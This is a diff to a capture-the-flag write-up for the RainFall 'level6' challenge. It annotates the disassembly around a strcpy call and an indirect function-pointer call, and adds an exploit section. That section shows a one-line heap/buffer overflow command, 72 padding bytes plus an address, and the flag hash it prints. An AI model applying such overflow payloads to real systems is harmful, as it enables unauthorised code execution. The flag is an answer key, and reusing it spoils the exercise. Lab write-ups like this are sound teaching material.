@@ -32,10 +32,10 @@ Dump of assembler code for function main:
    0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
    0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
    0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
-   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
+   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>       ; strcpy()
    0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
    0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
-   0x080484d0 <+84>:    call   eax
+   0x080484d0 <+84>:    call   eax                          ; call eax where eax point to <m>
    0x080484d2 <+86>:    leave
    0x080484d3 <+87>:    ret
 End of assembler dump.
@@ -69,4 +69,7 @@ End of assembler dump.
 
 ## Exploit
 
-Here everything concerning the exploit description.
+```console
+level6@RainFall:~$ ./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
